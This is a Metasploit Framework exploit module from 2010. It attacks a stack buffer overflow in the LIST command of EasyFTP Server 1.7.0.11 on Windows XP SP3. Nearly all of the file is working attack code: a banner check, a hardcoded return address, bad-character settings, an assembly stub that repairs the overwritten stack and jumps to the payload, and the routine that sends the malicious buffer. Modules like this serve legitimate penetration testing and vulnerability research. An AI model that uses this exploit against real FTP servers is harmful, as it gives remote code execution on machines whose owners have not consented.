##
# $Id: easyftp_list_fixret.rb 9953 2010-08-03 16:17:43Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# EDB-ID: 14400
# Date : July 5, 2010
# Discovered by : Karn Ganeshen
# Version : 1.7.0.11
# Tested on : Windows XP SP3 Version 2002
# MFR  & VAS TEAM : just testing howto convert exploits to metasploit modules.
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'EasyFTP Server <= 1.7.0.11 LIST Command Stack Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in EasyFTP Server 1.7.0.11.
				credit goes to Karn Ganeshan.

				NOTE: Although, this is likely to exploit the same vulnerability as the
				'easyftp_cwd_fixret' exploit, it uses a slightly different vector.
			},
			'Author'         =>
				[
					'Karn Ganeshan <karnganeshan [at] gmail.com>', # original version
					'MFR',    # convert to metasploit format.
					'jduck'   # modified to use fix-up stub (works with bigger payloads)
				],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9953 $',
			'References'     =>
				[
					[ 'OSVDB', '62134' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/14400/' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/14451/' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x0a\x0d\x2f\x5c",
					'DisableNops' => true
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP3 - Version 2002',   { 'Ret' => 0x7e49732b } ], # call edi from user32.dll (v5.1.2600.5512)
				],
			'DisclosureDate' => 'July 5 2010',
			'DefaultTarget' => 0))
	end

	def check
		connect
		disconnect

		if (banner =~ /BigFoolCat/)
			return Exploit::CheckCode::Vulnerable
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		connect_login

		# NOTE:
		# This exploit jumps to edi, which happens to point at a partial version of
		# the 'buf' string in memory. The fixRet below fixes up the code stored on the
		# stack and then jumps there to execute the payload. The value in esp is used
		# with an offset for the fixup.
		fixRet_asm = %q{
			mov edi,esp
			mov [edi], 0xfeedfed5
			add edi, 0xfffffff4
			mov byte ptr [edi], 0xc0
			add edi,4
			mov [edi], 0xdeadbeef
			add edi, 0xffffff24
			add esp, 0xfffffe04
			jmp edi
		}
		fixRet = Metasm::Shellcode.assemble(Metasm::Ia32.new, fixRet_asm).encode_string

		buf = ''

		print_status("Prepending fixRet...")
		buf << fixRet
		buf << make_nops(0x30 - buf.length)

		print_status("Adding the payload...")
		buf << payload.encoded

		# Patch the original stack data into the fixer stub
		buf[4, 4] = buf[268 + 8, 4]
		buf[16, 1] = buf[268-4, 1]
		buf[22, 4] = buf[268, 4]

		print_status("Overwriting part of the payload with target address...")
		buf[268,4] = [target.ret].pack('V') # put return address @ 268 bytes

		print_status("Sending exploit buffer...")
		send_cmd( ['LIST', buf] , false)

		handler
		disconnect
	end

end
